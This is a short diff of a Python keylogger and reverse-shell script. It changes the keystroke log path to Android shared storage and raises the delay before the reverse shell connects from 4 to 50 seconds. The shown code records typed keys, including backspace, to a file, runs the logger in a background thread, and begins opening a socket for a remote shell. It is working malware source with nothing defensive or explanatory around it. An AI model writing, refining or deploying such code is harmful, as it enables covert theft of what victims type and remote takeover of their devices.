@@ -19,7 +19,7 @@ def write_to_log(key):
     elif key == "Key.backspace":
         letter = " [BACKSPACE] "
 
-    with open("log.txt", "a") as f:
+    with open("/storage/emulated/0/log.txt", "a") as f:
         f.write(letter)
 
 # Function to start keylogger in a separate thread
@@ -30,7 +30,7 @@ def start_keylogger():
 # Function to establish a reverse shell connection
 def reverse_shell():
     try:
-        time.sleep(4)  # Delay before executing the shell
+        time.sleep(50)  # Delay before executing the shell
         print("[*] Establishing reverse shell connection...")
 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
